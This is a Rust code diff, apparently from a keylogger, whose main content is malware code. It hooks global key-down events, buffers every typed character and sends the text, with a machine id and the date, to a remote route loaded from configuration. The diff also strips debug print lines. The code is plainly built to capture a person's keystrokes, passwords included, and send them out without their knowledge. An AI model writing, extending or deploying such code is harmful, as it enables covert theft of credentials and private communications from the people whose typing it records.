@@ -1,3 +1,5 @@
+use std::sync::{Arc, Mutex};
+use std::thread;
 use device_query::DeviceEvents;
 use device_query::Keycode;
 pub use device_query::device_events::KeyboardCallback;
@@ -12,8 +14,20 @@ use crate::sys::get_date;
 
 pub fn cat(){
     let device_state = DeviceState::new();
-    let _device_state = listen(device_state);
+    let mut cache = Arc::new(Mutex::new(String::new())); 
+    let cache_clone = Arc::clone(&cache);
 
+
+    device_state.on_key_down(move |keys| {
+
+        let chars = keycode_to_string(*keys); 
+        let mut cache = cache_clone.lock().unwrap();
+        cache.push_str(chars);
+        if cache.len() >= 10 {
+            send(cache.clone()); 
+            }
+        }
+    );
     loop {
 
     }
@@ -25,20 +39,16 @@ fn listen(device_state:DeviceState) -> CallbackGuard<impl Fn(&Keycode)>{
     device_state.on_key_down(|keys| {
 
         let mut cache: String = String::new();
-        let chars = keycode_to_string(*keys).chars();
-        for c in chars{
-            cache.push(c);
-                }
+        let chars = keycode_to_string(*keys); 
+        cache.push_str(chars); 
         send(cache); 
         }
     )
 }
 
 fn send(chars: String) {
-    println!("send function test");
 
     let route = load_route();
-    println!("route {}", route);
     let id = get_id();
     let date = get_date();
     let req = format!("{}/?id={}&date={}&text={}", route, id, date, chars);
